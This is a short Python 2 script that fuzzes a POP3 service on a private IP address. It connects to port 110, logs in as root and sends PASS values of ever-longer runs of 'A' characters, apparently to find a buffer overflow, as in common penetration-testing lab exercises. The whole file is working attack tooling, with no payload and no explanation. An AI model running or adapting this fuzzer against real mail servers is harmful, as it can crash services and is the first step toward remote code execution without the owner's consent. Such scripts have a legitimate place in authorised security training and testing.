#!/usr/bin/python	
  
import socket	
 	
buffer=["A"]	
  
counter=100	
  
while len(buffer)<=30:	
   buffer.append("A"*counter)		
   counter=counter+200	
  
	
  
for string in buffer:	
   print"Fuzzing PASS with %s bytes" %	len(string)		
   s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)	
   connect=s.connect(('192.168.250.158',110))	
   data=s.recv(1024)
   #print str(data)
   s.send('USER root\r\n')		
   data=s.recv(1024)
   print str(data)	
   s.send('PASS	' + string + '\r\n')		
   s.send('QUIT\r\n')		
   s.close()	
  
